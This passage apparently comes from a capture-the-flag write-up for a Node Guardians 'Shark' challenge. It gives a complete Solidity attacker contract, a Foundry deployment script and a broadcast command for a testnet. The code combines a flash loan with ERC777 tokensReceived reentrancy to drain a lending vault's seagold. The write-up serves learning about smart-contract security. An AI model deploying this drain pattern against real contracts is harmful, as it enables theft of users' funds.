+</span></span><span class="line"><span class="cl"><span class="c1">// This is the registry that tells for a given contract which interface its supports
+</span></span></span><span class="line"><span class="cl"><span class="c1">// There is a getter and a setter.
+</span></span></span><span class="line"><span class="cl"><span class="c1">// The manager of a contrat is the contract itself by default.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">interface</span> <span class="nc">ERC1820Registry</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kd">function</span> <span class="nf">getInterfaceImplementer</span><span class="p">(</span><span class="kt">address</span> <span class="n">_addr</span><span class="p">,</span> <span class="kt">bytes32</span> <span class="n">_interfaceHash</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nf">setInterfaceImplementer</span><span class="p">(</span><span class="kt">address</span> <span class="n">_addr</span><span class="p">,</span> <span class="kt">bytes32</span> <span class="n">_interfaceHash</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_implementer</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// This is the vault we are going to attack
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">interface</span> <span class="nc">SharkVault</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// The Shark charges predatory interest rates...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">INTEREST_RATE_PERCENT</span><span class="p">()</span> <span class="k">external</span> <span class="k">returns</span><span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">gold</span><span class="p">()</span> <span class="k">external</span> <span class="k">returns</span><span class="p">(</span><span class="kt">address</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">seagold</span><span class="p">()</span> <span class="k">external</span> <span class="k">returns</span><span class="p">(</span><span class="kt">address</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">struct</span> <span class="nc">LoanAccount</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">depositedGold</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">borrowedSeagold</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">lastBlock</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">depositGold</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">external</span> <span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">withdrawGold</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">external</span> <span class="k">payable</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">borrow</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">repay</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">liquidate</span><span class="p">(</span><span class="kt">address</span> <span class="n">_borrower</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">updatedAccount</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">_accountOwner</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="n">LoanAccount</span> <span class="k">memory</span> <span class="n">account</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// This is one of the interface of our attacker contract.
+</span></span></span><span class="line"><span class="cl"><span class="c1">// onFlashLoan will be called by the FlashLender (see the next interface)
+</span></span></span><span class="line"><span class="cl"><span class="c1">// when this function is called we actually have the gold token in the 
+</span></span></span><span class="line"><span class="cl"><span class="c1">// attacker contract
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">interface</span> <span class="nc">IERC3156FlashBorrower</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">onFlashLoan</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">initiator</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">token</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">amount</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">fee</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span> <span class="n">calldata</span> <span class="nb">data</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bytes32</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// This one is the interface for the flash loan borrower.
+</span></span></span><span class="line"><span class="cl"><span class="c1">// This is where we find the initial golds that will boostrap the whole attack
+</span></span></span><span class="line"><span class="cl"><span class="c1">// and the ones that we have to repay at the end of the flashloan (+ fee) but there
+</span></span></span><span class="line"><span class="cl"><span class="c1">// is no fees in this scenario.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">interface</span> <span class="nc">IERC3156FlashLender</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">maxFlashLoan</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">token</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">flashFee</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">token</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">amount</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">flashLoan</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">IERC3156FlashBorrower</span> <span class="n">receiver</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">token</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">amount</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span> <span class="n">calldata</span> <span class="nb">data</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// This is the second interface that our FlashLoan contract implement
+</span></span></span><span class="line"><span class="cl"><span class="c1">// It is basically where the re-entrancy attack begins !
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">interface</span> <span class="nc">IERC777TokensRecipient</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">tokensReceived</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">operator</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="k">from</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">to</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">amount</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span> <span class="n">calldata</span> <span class="n">userData</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span> <span class="n">calldata</span> <span class="n">operatorData</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// And there it is ! The FlashLoan attacker contract wich implements the whole
+</span></span></span><span class="line"><span class="cl"><span class="c1">// attack logic
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kd">contract</span> <span class="nc">FlashLoan</span> <span class="k">is</span> <span class="n">IERC3156FlashBorrower</span><span class="p">,</span> <span class="n">IERC777TokensRecipient</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">IERC20</span> <span class="n">gold</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IERC20</span> <span class="n">seagold</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IERC3156FlashLender</span> <span class="n">flashLender</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">SharkVault</span> <span class="n">vault</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">bool</span> <span class="n">pwned</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ERC1820Registry</span> <span class="n">registry</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// First, we get all the utilities we will need to access during the attack
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_flashLender</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_gold</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_seagold</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_vault</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_registry</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">gold</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">_gold</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">seagold</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">_seagold</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">flashLender</span> <span class="o">=</span> <span class="n">IERC3156FlashLender</span><span class="p">(</span><span class="n">_flashLender</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">vault</span> <span class="o">=</span> <span class="n">SharkVault</span><span class="p">(</span><span class="n">_vault</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">registry</span> <span class="o">=</span> <span class="n">ERC1820Registry</span><span class="p">(</span><span class="n">_registry</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// The attack is in two phases:
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="c1">// - 1) State that the contract implement the interface for the tokenReceived method
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="c1">//      in the ERC1820 registry
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="c1">// - 2) Launch the actual attack starting with the flashloan on the Flash Lender contract
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">attack</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">registry</span><span class="p">.</span><span class="n">setInterfaceImplementer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="mh">0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">uint</span> <span class="n">maxAmount</span> <span class="o">=</span> <span class="n">flashLender</span><span class="p">.</span><span class="n">maxFlashLoan</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">gold</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">      <span class="n">flashLender</span><span class="p">.</span><span class="n">flashLoan</span><span class="p">(</span><span class="nb">this</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="n">gold</span><span class="p">),</span> <span class="n">maxAmount</span><span class="p">,</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encode</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// Once the loan is authorized by the Flash Lender it calls this function
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// on the our flash loan attacker contract
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">onFlashLoan</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">initiator</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">token</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">amount</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">fee</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span> <span class="n">calldata</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">public</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bytes32</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="c1">// Those are almost useless check
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nb">require</span><span class="p">(</span><span class="n">initiator</span> <span class="o">==</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="s">&#39;Wrong initiator&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nb">require</span><span class="p">(</span><span class="n">token</span> <span class="o">==</span> <span class="kt">address</span><span class="p">(</span><span class="n">gold</span><span class="p">),</span> <span class="s">&#39;Not gold&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="nb">require</span><span class="p">(</span><span class="n">fee</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#39;Fee must be 0&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">			<span class="c1">// First we deposit the gold token into the vault as collateral
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nb">require</span><span class="p">(</span><span class="n">gold</span><span class="p">.</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">vault</span><span class="p">),</span> <span class="n">amount</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">      <span class="n">vault</span><span class="p">.</span><span class="n">depositGold</span><span class="p">(</span><span class="n">amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			
+</span></span><span class="line"><span class="cl">			<span class="c1">// Then we borrow some seagold
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="c1">// if everyting is fine the function to be called is tokenReceived down
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="c1">// bellow
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="c1">// The first borrow is intentionally of 0 since when we are going to 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="c1">// depop from the stack it&#39;s going to be the last value... So we&#39;ll
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="c1">// have nothing to repay in order to leave the shark vault :)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">vault</span><span class="p">.</span><span class="n">borrow</span><span class="p">(</span><span class="mi">0</span> <span class="kc">ether</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			
+</span></span><span class="line"><span class="cl">			<span class="c1">// This is called only once the recursion is over
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="c1">// And it correspond to the withdrawing of the collateral from the 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="c1">// shark vault
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">vault</span><span class="p">.</span><span class="n">withdrawGold</span><span class="p">(</span><span class="n">amount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			
+</span></span><span class="line"><span class="cl">			<span class="c1">// Finally we can approve the gold transfer in order to repay the initial
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="c1">// loan made to the Flash Lender !
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nb">require</span><span class="p">(</span><span class="n">gold</span><span class="p">.</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">flashLender</span><span class="p">),</span> <span class="n">amount</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">			<span class="c1">// And don&#39;t forget to return the expected hash:
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">return</span> <span class="nb">keccak256</span><span class="p">(</span><span class="s">&#34;ERC3156FlashBorrower.onFlashLoan&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">tokensReceived</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">address</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">address</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">address</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">uint256</span> <span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">bytes</span> <span class="n">calldata</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">bytes</span> <span class="n">calldata</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="kt">uint</span> <span class="n">amount</span> <span class="o">=</span> <span class="n">seagold</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">vault</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">			<span class="c1">// classic recursion pattern to prevent infinte loop
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">if</span> <span class="p">(</span><span class="n">amount</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="c1">// since there is 1000 ether of collateral 750 is the max amount we can borrow
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">vault</span><span class="p">.</span><span class="n">borrow</span><span class="p">(</span><span class="mi">750</span> <span class="kc">ether</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0">
+    <button
+      class="code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50"
+      title="Copy code"
+    >
+      <div class="group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4"></div>
+      <div class="hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4"></div>
+    </button>
+  </div>
+</div>
+<p>And here is the deployment script:</p>
+<div class="code-block relative mt-6 first:mt-0 group/code"><div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/Script.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/console.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">SharkVault</span><span class="p">,</span> <span class="n">IERC20</span><span class="p">,</span> <span class="n">FlashLoan</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;../src/Attack.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">POC</span> <span class="k">is</span> <span class="n">Script</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">deployerPrivateKey</span> <span class="o">=</span> <span class="n">vm</span><span class="p">.</span><span class="n">envUint</span><span class="p">(</span><span class="s">&#34;PRIVATE_KEY&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">INSTANCE</span> <span class="o">=</span> <span class="n">vm</span><span class="p">.</span><span class="n">envAddress</span><span class="p">(</span><span class="s">&#34;INSTANCE&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">FLASH_LENDER</span> <span class="o">=</span> <span class="n">vm</span><span class="p">.</span><span class="n">envAddress</span><span class="p">(</span><span class="s">&#34;FLASH_LENDER&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">REGISTRY</span> <span class="o">=</span> <span class="n">vm</span><span class="p">.</span><span class="n">envAddress</span><span class="p">(</span><span class="s">&#34;ERC1820REGISTRY&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">(</span><span class="n">deployerPrivateKey</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">SharkVault</span> <span class="n">vault</span> <span class="o">=</span> <span class="n">SharkVault</span><span class="p">(</span><span class="n">INSTANCE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">IERC20</span> <span class="n">gold</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">vault</span><span class="p">.</span><span class="n">gold</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="n">IERC20</span> <span class="n">seagold</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">vault</span><span class="p">.</span><span class="n">seagold</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">FlashLoan</span> <span class="n">flashLoan</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FlashLoan</span><span class="p">(</span><span class="n">FLASH_LENDER</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="n">gold</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="n">seagold</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="n">vault</span><span class="p">),</span> <span class="n">REGISTRY</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">logAddress</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">gold</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">logAddress</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">seagold</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">logUint</span><span class="p">(</span><span class="n">gold</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">vault</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">logUint</span><span class="p">(</span><span class="n">seagold</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">vault</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">flashLoan</span><span class="p">.</span><span class="n">attack</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">console</span><span class="p">.</span><span class="n">logUint</span><span class="p">(</span><span class="n">seagold</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">vault</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">stopBroadcast</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0">
+    <button
+      class="code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50"
+      title="Copy code"
+    >
+      <div class="group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4"></div>
+      <div class="hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4"></div>
+    </button>
+  </div>
+</div>
+<div class="code-block relative mt-6 first:mt-0 group/code"><div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="n">forge</span> <span class="n">script</span> <span class="n">script</span><span class="o">/</span><span class="n">Shark</span><span class="p">.</span><span class="n">s</span><span class="p">.</span><span class="n">sol</span> <span class="o">--</span><span class="n">rpc</span><span class="o">-</span><span class="n">url</span> <span class="err">$</span><span class="n">GOERLI_RPC_URL</span> <span class="o">-</span><span class="n">vvvv</span> <span class="o">--</span><span class="n">broadcast</span> <span class="o">--</span><span class="n">verify</span></span></span></code></pre></div></div><div class="opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0">
+    <button
+      class="code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50"
+      title="Copy code"
+    >
+      <div class="group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4"></div>
+      <div class="hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4"></div>
+    </button>
+  </div>
+</div>
+
+        </div>
+        <div class="mt-16"></div>
+        <div class="mb-8 flex items-center border-t pt-8 dark:border-neutral-800 contrast-more:border-neutral-400 dark:contrast-more:border-neutral-400 print:hidden"><a
+        href="/projects/node-guardians/wintermute-rekt-d0fd4609147941e6af7fcc68ef81da6a/"
+        title="Wintermute Rekt"
+        class="flex max-w-[50%] items-center gap-1 py-4 text-base font-medium text-gray-600 transition-colors [word-break:break-word] hover:text-primary-600 dark:text-gray-300 md:text-lg ltr:pr-4 rtl:pl-4"
+      ><svg class="inline h-5 shrink-0 ltr:rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/></svg>Wintermute Rekt</a><a
+        href="/projects/node-guardians/poly-network-rekt-b7b8b11820c249bcb1f96a50fc20d478/"
+        title="Poly Network Rekt"
